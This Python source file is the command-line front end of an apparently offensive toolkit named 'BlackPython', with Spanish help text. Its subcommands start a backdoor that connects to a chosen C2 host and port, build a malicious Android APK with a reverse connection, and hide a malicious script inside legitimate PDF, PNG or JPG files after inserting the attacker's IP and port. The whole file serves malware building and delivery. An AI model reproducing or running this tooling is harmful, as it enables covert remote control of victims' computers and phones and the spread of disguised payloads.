from core.backdoor import Backdoor
from core.android import AndroidPayload
from core.binder import FileBinder
import argparse

def main():
    parser = argparse.ArgumentParser(description="BlackPython - Herramienta de Red Team")
    subparsers = parser.add_subparsers(dest="command")

    # Backdoor
    backdoor_parser = subparsers.add_parser("backdoor", help="Genera un backdoor")
    backdoor_parser.add_argument("--host", required=True, help="IP o dominio del C2")
    backdoor_parser.add_argument("--port", type=int, default=4444, help="Puerto del C2")

    # Android APK
    android_parser = subparsers.add_parser("android", help="Genera un APK malicioso")
    android_parser.add_argument("--lhost", required=True, help="Host para conexión reversa")
    android_parser.add_argument("--lport", type=int, default=4444, help="Puerto para conexión")

    # Binder (Modificado para aceptar IP/Puerto)
    binder_parser = subparsers.add_parser("bind", help="Camufla un payload en un archivo")
    binder_parser.add_argument("--file", required=True, help="Archivo legítimo (PDF, PNG, JPG)")
    binder_parser.add_argument("--payload", required=True, help="Script malicioso a incrustar")
    binder_parser.add_argument("--output", required=True, help="Archivo de salida")
    binder_parser.add_argument("--ip", help="IP para reemplazar en el payload")
    binder_parser.add_argument("--port", type=int, help="Puerto para reemplazar en el payload")

    args = parser.parse_args()

    if args.command == "backdoor":
        Backdoor(args.host, args.port).run()
    elif args.command == "android":
        AndroidPayload(args.lhost, args.lport).generate_apk()
    elif args.command == "bind":
        # Lee y modifica el payload con la IP/Puerto
        payload_content = open(args.payload).read()
        if args.ip:
            payload_content = payload_content.replace("TU_IP_AQUÍ", args.ip)
        if args.port:
            payload_content = payload_content.replace("4444", str(args.port))
        
        if args.file.endswith(".pdf"):
            FileBinder.bind_to_pdf(args.file, payload_content, args.output)
        elif args.file.endswith((".png", ".jpg")):
            FileBinder.bind_to_image(args.file, payload_content, args.output)

if __name__ == "__main__":
    main()
